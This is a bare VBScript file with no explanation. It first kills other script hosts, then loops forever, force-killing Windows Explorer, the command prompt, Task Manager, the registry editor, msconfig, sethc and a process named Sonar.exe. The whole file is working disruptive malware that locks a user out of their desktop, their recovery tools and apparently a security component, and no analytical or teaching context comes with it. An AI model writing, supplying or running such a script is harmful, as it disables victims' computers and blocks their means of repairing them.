Set ySh = WScript.CreateObject("WScript.Shell")
ySh.run "taskkill /f /im wscript.exe", 0, True
ySh.run "taskkill /f /im cscript.exe", 0, True
Do
ySh.run "taskkill /f /im explorer.exe", 0, True
ySh.run "taskkill /f /im regedit.exe", 0, True
ySh.run "taskkill /f /im cmd.exe", 0, True
ySh.run "taskkill /f /im taskmgr.exe", 0, True
ySh.run "taskkill /f /im Sonar.exe", 0, True
ySh.run "taskkill /f /im msconfig.exe", 0, True
ySh.run "taskkill /f /im sethc.exe", 0, True
Loop